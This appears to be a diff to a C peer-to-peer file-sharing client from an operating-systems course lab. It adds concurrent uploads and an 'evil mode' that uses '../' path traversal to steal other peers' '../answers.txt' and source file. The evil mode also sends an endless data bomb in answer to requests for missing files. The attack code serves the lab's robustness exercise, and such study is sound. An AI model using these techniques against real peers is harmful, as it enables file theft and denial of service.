@@ -40,6 +40,7 @@ static int listen_port;
 #define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256		// Size of task_t::filename
 #define MAXFILESIZ 10485760	// Max size of file, 10 MB
+#define MAXPEERNUM 10		// Maximum number of peers to be connected to
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -585,9 +586,9 @@ static void task_download(task_t *t, task_t *tracker_task)
 	// at all.
 	char req_file[FILENAMESIZ];
 	strcpy(req_file, t->filename);
-	// If we're stealing a file, rename to disk as stolen_file
-	if (evil_mode && req_file[0] == '.')
-		strcpy(req_file, "stolen_file");
+	// If we're stealing a file, prepend 'st_' to diskname
+	if (evil_mode && strstr(req_file,"../") == req_file)
+		strncpy(req_file, "st_", 3);
 	for (i = 0; i < 50; i++) {
 		if (i == 0)
 			strcpy(t->disk_filename, req_file);
@@ -684,6 +685,32 @@ static task_t *task_listen(task_t *listen_task)
 	return t;
 }
 
+// file_exists(filename)
+//	Returns 1 if file is in current directory, 0 otherwise
+static int file_exists(const char *filename) {
+	DIR *dir;
+	struct dirent *ent;
+	struct stat s;
+	message("* Searching directory for the requested file %s\n", filename);
+	if ((dir = opendir(".")) == NULL)
+		die("open directory: %s", strerror(errno));
+	while ((ent = readdir(dir)) != NULL) {
+		int namelen = strlen(ent->d_name);
+		
+		// don't depend on unreliable parts of the dirent structure
+		// and only report regular files.  Do not change these lines.
+		if (stat(ent->d_name, &s) < 0 || !S_ISREG(s.st_mode)
+			|| (namelen > 2 && ent->d_name[namelen - 2] == '.'
+				&& (ent->d_name[namelen - 1] == 'c'
+					|| ent->d_name[namelen - 1] == 'h'))
+			|| (namelen > 1 && ent->d_name[namelen - 1] == '~')) {
+		} else if (strcmp(ent->d_name, filename) == 0) {
+			return 1;
+		}
+	}
+	closedir(dir);
+	return 0;
+}
 
 // task_upload(t)
 //	Handles an upload request from another peer.
@@ -694,6 +721,7 @@ static void task_upload(task_t *t)
 	assert(t->type == TASK_UPLOAD);
 	// First, read the request from the peer.
 	while (1) {
+		memset(t->buf, 0, TASKBUFSIZ);
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		message("* Read task_upload request: %s\n", t->buf);
 		if (ret == TBUF_ERROR) {
@@ -716,41 +744,15 @@ static void task_upload(task_t *t)
 	t->head = t->tail = 0;
 	
 	// Check whether file is in current directory
-	DIR *dir;
-	struct dirent *ent;
-	struct stat s;
-	int exists = 0;
-	message("* Searching directory for the requested file %s\n", t->filename);
-	if ((dir = opendir(".")) == NULL)
-		die("open directory: %s", strerror(errno));
-	while ((ent = readdir(dir)) != NULL) {
-		int namelen = strlen(ent->d_name);
-		
-		// don't depend on unreliable parts of the dirent structure
-		// and only report regular files.  Do not change these lines.
-		if (stat(ent->d_name, &s) < 0 || !S_ISREG(s.st_mode)
-		    || (namelen > 2 && ent->d_name[namelen - 2] == '.'
-				&& (ent->d_name[namelen - 1] == 'c'
-					|| ent->d_name[namelen - 1] == 'h'))
-		    || (namelen > 1 && ent->d_name[namelen - 1] == '~')) {
-		} else if (strcmp(ent->d_name, t->filename) == 0) {
-			exists = 1;
-			break;
-		}
-	}
-	closedir(dir);
+	int exists = file_exists(t->filename);
 	
 	// Send infinite data bomb in evil mode (if a bad file was requested)
-	int bomb = 0;
-	if (!exists) {
-		if (evil_mode) {
-			error("* File %s does not exist in directory; evilmode replacing with bomb\n", t->filename);
-			bomb = 1;
-			strcpy(t->filename, "../osppeer");
-		} else {
-			error("* File %s does not exist in directory \n", t->filename);
-			goto exit;
-		}
+	if (evil_mode && !exists) {
+		error("* Evilmode replacing missing file with bomb\n", t->filename);
+		strcpy(t->filename, "../osppeer");
+	} else if (!exists) {
+		error("* File %s does not exist in directory \n", t->filename);
+		goto exit;
 	}
 	
 	// Open file
@@ -760,7 +762,7 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 
-	message("* Transferring file %s\n", t->filename);
+	message("* Transferring file %s, infinite mode = %i\n", t->filename, evil_mode);
 	
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
@@ -775,10 +777,10 @@ static void task_upload(task_t *t)
 		if (ret == TBUF_ERROR) {
 			error("* Disk read error");
 			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail && !bomb) {
+		} else if (ret == TBUF_END && t->head == t->tail && !evil_mode) {
 			/* End of file */
 			break;
-		} else if (ret == TBUF_END && t->head == t->tail && bomb) {
+		} else if (ret == TBUF_END && t->head == t->tail && evil_mode) {
 			// Evil mode: file upload never ends, repeatedly write to peer buffer
 			t->head = beginning;
 		}
@@ -790,6 +792,62 @@ static void task_upload(task_t *t)
 	task_free(t);
 }
 
+// upload files using select and forked processes
+static void upload_files (task_t *listen_task) {
+	struct sockaddr_in peer_addr;
+	socklen_t peer_addrlen = sizeof(peer_addr);
+	
+	fd_set masterset, set;
+	FD_ZERO(&masterset);
+	FD_ZERO(&set);
+	FD_SET(listen_task->peer_fd, &masterset);
+	int max_fd = listen_task->peer_fd + 1;
+	
+	task_t *task_list[MAXPEERNUM];
+	memset(task_list, 0, MAXPEERNUM * sizeof(task_t *));
+	
+	int task_num = 0;
+	while (1) {
+		set = masterset;
+		int s = select(max_fd, &set, NULL, NULL, NULL);
+		if (s < 0)
+			error("* select failed\n");
+		else {
+			int fd;
+			for (fd = 0; fd <= max_fd; fd++) {
+				if (FD_ISSET(fd, &set)) { // new connection
+					if (fd == listen_task->peer_fd) {
+						int child = fork();
+						if (child == 0) {
+							task_t *t = task_listen(listen_task);
+							task_upload(t);
+							exit(0);
+						} else if (child < 0) {
+							error("* Unable to generate child process!\n");
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+// steal_file(tracker_task, filename)
+//	Single file download task (used for thieving)
+static void steal_file(task_t *tracker_task, const char *filename) {
+	task_t *t;
+	if ((t = who(tracker_task))) {
+		int child = fork();
+		if (child == 0) {
+			strcpy(t->filename, filename);
+			task_download(t, tracker_task);
+			exit(0);
+		} else if (child < 0) {
+			die("* Error creating child process!\n");
+		}
+	}
+	return;
+}
 
 // main(argc, argv)
 //	The main loop!
@@ -870,19 +928,10 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
+	// Thievery: steal other users' answers file
 	if (evil_mode) {
-		if ((t = who(tracker_task))) {
-			child = fork();
-			if (child == 0) {
-				strcpy(t->filename, "../answers.txt");
-				task_download(t, tracker_task);
-				exit(0);
-			} else if (child < 0) {
-				error("* Error creating child process!\n");
-			}
-			
-			
-		}
+		steal_file(tracker_task, "../answers.txt");
+		steal_file(tracker_task, "../osppeer.c");
 	}
 	
 	// First, download files named on command line.
@@ -891,10 +940,6 @@ int main(int argc, char *argv[])
 			child = fork();
 			if (child == 0) {
 				task_download(t, tracker_task);
-				// After file download is complete, serve upload requests
-				message("* Download complete. Listening for requests...\n");
-				while ((t = task_listen(listen_task)))
-					task_upload(t);
 				exit(0);
 			} else if (child > 0) {
 				continue;
@@ -905,18 +950,7 @@ int main(int argc, char *argv[])
 	}
 	
 	// Parent serves upload requests
-	while ((t = task_listen(listen_task)))
-		task_upload(t);
+	upload_files (listen_task);
 	
-	/*
-	while ((t = task_listen(listen_task))) {
-		child = fork();
-		if (child == 0) {
-			task_upload(t);
-			exit(0);
-		} else if (child < 0) {
-			die("* Error creating child process!\n");
-		}
-	}*/
 	return 0;
 }
